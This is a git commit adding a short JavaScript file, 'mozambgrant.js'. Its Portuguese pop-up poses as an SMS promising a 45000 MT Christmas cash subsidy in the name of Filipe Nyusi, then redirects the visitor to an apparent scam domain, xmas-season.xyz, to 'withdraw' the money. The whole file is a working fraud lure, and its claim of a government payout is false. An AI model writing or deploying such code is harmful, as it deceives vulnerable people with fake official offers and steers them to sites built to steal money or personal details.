ac466836c0a787a9c9049426676fad6d3f1fd6fe
bigetijazz14 <bigetijazz14@gmail.com>
2024-12-08 18:07:49 -0800

    Create mozambgrant.js

---
+++ mozambgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMAÇÃO 45000 MT'
+password=prompt('SMS: Parabéns, é elegível para FILIPE NYUSI 45000 MT SUBSÍDIO EM DINHEIRO DE NATAL PARA TODOS, Por favor pressione OK para RECLAMAÇÃO Prémio em Dinheiro','RECLAMAÇÃO 45000 MT');
+if (password != 'RECLAMAÇÃO 45000 MT') {
+location.href='https://www.xmas-season.xyz/retirar-45000MT';
+}
